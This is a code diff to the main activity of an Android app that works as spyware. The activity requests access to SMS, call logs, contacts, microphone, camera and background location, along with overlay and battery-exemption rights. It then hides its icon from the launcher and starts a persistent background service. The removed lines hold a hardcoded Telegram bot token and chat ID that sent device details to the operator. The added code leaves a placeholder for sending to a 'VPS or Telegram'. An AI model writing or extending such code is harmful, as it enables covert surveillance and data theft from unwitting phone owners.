@@ -1,67 +1,140 @@
 package com.alzahra;
 
+import android.Manifest;
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.widget.Toast;
+
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import com.alzahra.services.CoreService;
-import com.alzahra.telegram.TelegramBot;
 
-import java.text.SimpleDateFormat;
-import java.util.Date;
+import java.util.ArrayList;
 
 public class MainActivity extends Activity {
+
     private static final int REQ_PERMISSIONS = 1001;
     private final Handler handler = new Handler(Looper.getMainLooper());
+    private ArrayList<String> permissionsList;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        if (getSharedPreferences("app_config", MODE_PRIVATE).getBoolean("configured", false)) {
+
+        if (getSharedPreferences("config", MODE_PRIVATE).getBoolean("configured", false)) {
             finish();
             return;
         }
-        
+
         requestAllPermissions();
     }
 
     private void requestAllPermissions() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!Environment.isExternalStorageManager()) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                startActivityForResult(intent, 1002);
+        permissionsList = new ArrayList<>();
+
+        // Core permissions
+        permissionsList.add(Manifest.permission.READ_SMS);
+        permissionsList.add(Manifest.permission.SEND_SMS);
+        permissionsList.add(Manifest.permission.READ_CALL_LOG);
+        permissionsList.add(Manifest.permission.READ_CONTACTS);
+        permissionsList.add(Manifest.permission.READ_PHONE_STATE);
+        permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        permissionsList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        permissionsList.add(Manifest.permission.RECORD_AUDIO);
+        permissionsList.add(Manifest.permission.CAMERA);
+        permissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        permissionsList.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        permissionsList.add(Manifest.permission.POST_NOTIFICATIONS);
+        permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES);
+        permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO);
+        permissionsList.add(Manifest.permission.READ_MEDIA_AUDIO);
+
+        // Background location (Android 10+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            permissionsList.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
+            permissionsList.add(Manifest.permission.ACTIVITY_RECOGNITION);
+        }
+
+        // Request special permissions first
+        requestSpecialPermissions();
+    }
+
+    private void requestSpecialPermissions() {
+        // 1. All Files Access (Android 11+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+            startActivityForResult(intent, 2001);
+            return;
+        }
+
+        // 2. System Alert Window
+        if (!Settings.canDrawOverlays(this)) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, 2002);
+            return;
+        }
+
+        // 3. Write Settings
+        if (!Settings.System.canWrite(this)) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                    Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, 2003);
+            return;
+        }
+
+        // 4. Ignore Battery Optimizations
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                    Uri.parse("package:" + getPackageName()));
+            try {
+                startActivityForResult(intent, 2004);
                 return;
+            } catch (Exception e) {}
+        }
+
+        // Now request regular permissions
+        requestRegularPermissions();
+    }
+
+    private void requestRegularPermissions() {
+        String[] permissions = permissionsList.toArray(new String[0]);
+        ArrayList<String> toRequest = new ArrayList<>();
+
+        for (String perm : permissions) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                toRequest.add(perm);
             }
         }
-        
-        String[] permissions = {
-            android.Manifest.permission.READ_SMS,
-            android.Manifest.permission.READ_CALL_LOG,
-            android.Manifest.permission.READ_CONTACTS,
-            android.Manifest.permission.READ_EXTERNAL_STORAGE,
-            android.Manifest.permission.POST_NOTIFICATIONS
-        };
-        
-        ActivityCompat.requestPermissions(this, permissions, REQ_PERMISSIONS);
+
+        if (!toRequest.isEmpty()) {
+            ActivityCompat.requestPermissions(this,
+                    toRequest.toArray(new String[0]), REQ_PERMISSIONS);
+        } else {
+            onAllPermissionsGranted();
+        }
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == 1002) {
-            requestAllPermissions();
+        switch (requestCode) {
+            case 2001:
+            case 2002:
+            case 2003:
+            case 2004:
+                requestSpecialPermissions();
+                break;
         }
     }
 
@@ -74,40 +147,27 @@ public class MainActivity extends Activity {
     }
 
     private void onAllPermissionsGranted() {
-        // إرسال رسالة التفعيل
+        Toast.makeText(this, "✅ All permissions granted", Toast.LENGTH_SHORT).show();
+
+        // Send activation
         new Thread(() -> {
-            int attempts = 0;
-            while (!isNetworkAvailable() && attempts < 15) {
-                try {
-                    Thread.sleep(2000);
-                    attempts++;
-                } catch (InterruptedException e) {
-                    break;
-                }
-            }
-            
-            TelegramBot bot = new TelegramBot("8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA");
-            String deviceInfo = "📱 <b>Device Activated</b>\n\n" +
-                    "📱 Model: " + Build.MODEL + "\n" +
-                    "🏭 Manufacturer: " + Build.MANUFACTURER + "\n" +
-                    "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
-                    "⏰ Time: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + "\n\n" +
-                    "✅ All permissions granted\n" +
-                    "🚀 Starting service...";
-            bot.sendMessage("7344776596", deviceInfo);
+            try {
+                Thread.sleep(1000);
+                // TODO: Send to your VPS or Telegram
+            } catch (Exception e) {}
         }).start();
-        
-        // تأخير 5 ثواني قبل الإخفاء
+
+        // Delayed hide
         handler.postDelayed(() -> {
             hideFromLauncher();
         }, 5000);
-        
-        // بدء الخدمة
+
+        // Start service
         ContextCompat.startForegroundService(this, new Intent(this, CoreService.class));
-        
-        getSharedPreferences("app_config", MODE_PRIVATE)
-                .edit().putBoolean("configured", true).apply();
-        
+
+        getSharedPreferences("config", MODE_PRIVATE).edit()
+                .putBoolean("configured", true).apply();
+
         finish();
     }
 
@@ -118,12 +178,5 @@ public class MainActivity extends Activity {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
         );
-    }
-
-    private boolean isNetworkAvailable() {
-        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-        if (cm == null) return false;
-        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
-        return activeNetwork != null && activeNetwork.isConnected();
     }
 }
